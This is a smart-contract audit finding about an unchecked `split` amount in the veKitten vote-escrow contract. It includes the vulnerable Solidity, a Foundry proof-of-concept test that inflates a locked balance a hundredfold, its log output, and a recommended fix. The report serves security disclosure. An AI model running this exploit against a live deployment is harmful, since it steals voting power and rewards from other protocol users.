# [C-01] `split` can be abused to create `locked` data with an arbitrary `amount`

## Summary


This report describes a bug in a function called `split` that allows a user to provide an arbitrary amount of tokens, which can result in one of the split tokens having a negative value. This can lead to the user gaining an unfair amount of voting power and balance, and potentially claim rewards from gauges and bribes. To fix this bug, the recommendation is to validate the provided amount to ensure it does not exceed the locked amount of the split token.

## Details

## Severity

**Impact:** High

**Likelihood:** High

## Description

Due to the lack of a check on the split amount inside `split`, a user can provide an arbitrary `_amount` to the function. Since `locked.amount` is stored as an `int128`, this can result in one of the split tokens having a negative value, while the other is set to the full `_amount` provided.

```solidity
    function split(
        uint _from,
        uint _amount
    ) external returns (uint _tokenId1, uint _tokenId2) {
        address msgSender = msg.sender;

        require(_isApprovedOrOwner(msgSender, _from));
        require(attachments[_from] == 0 && !voted[_from], "attached");
        require(_amount > 0, "Zero Split");

        // burn old NFT
        LockedBalance memory _locked = locked[_from];
        int128 value = _locked.amount;
        locked[_from] = LockedBalance(0, 0);
        _checkpoint(_from, _locked, LockedBalance(0, 0));
        _burn(_from);

        // set max lock on new NFTs
        _locked.end = block.timestamp + MAXTIME;

        int128 _splitAmount = int128(uint128(_amount));
        // @audit - underflow is possible
>>>     _locked.amount = value - _splitAmount; // already checks for underflow here in ^0.8.0
        _tokenId1 = _createSplitNFT(msgSender, _locked);

>>>     _locked.amount = _splitAmount;
        _tokenId2 = _createSplitNFT(msgSender, _locked);

        emit Split(
            _from,
            _tokenId1,
            _tokenId2,
            msgSender,
            uint(uint128(locked[_tokenId1].amount)),
            uint(uint128(_splitAmount)),
            _locked.end,
            block.timestamp
        );
    }
```

This can be abused by initially depositing a small amount of tokens, then calling `split` with an arbitrary amount to create a large `locked` data. Then can be withdrawn at the end of the lock period, and also grants an arbitrary amount of voting power and balance, which can be used to claim rewards from gauges and bribes.

PoC :

```solidity
    function testSplitVeKittenUnderflow() public {
        testDistributeVeKitten();

        vm.startPrank(user1);

        uint veKittenId = veKitten.tokenOfOwnerByIndex(user1, 0);
        (int128 lockedAmount, uint endTime) = veKitten.locked(veKittenId);

        (uint t1, uint t2) = veKitten.split(veKittenId, uint256(uint128(lockedAmount)) * 100);

        (int128 lockedAmountSplit, ) = veKitten.locked(t2);

        console.log("initial token to split locked amount :");
        console.log(lockedAmount);
        console.log("splitted token locked amount :");
        console.log(lockedAmountSplit);

        vm.stopPrank();
    }
```

Log output :

```shell
Logs:
  initial token to split locked amount :
  100000000000000000000000000
  splitted token locked amount :
  10000000000000000000000000000
```

## Recommendations

Validate that the provided `_amount` does not exceed the locked amount of the split token.
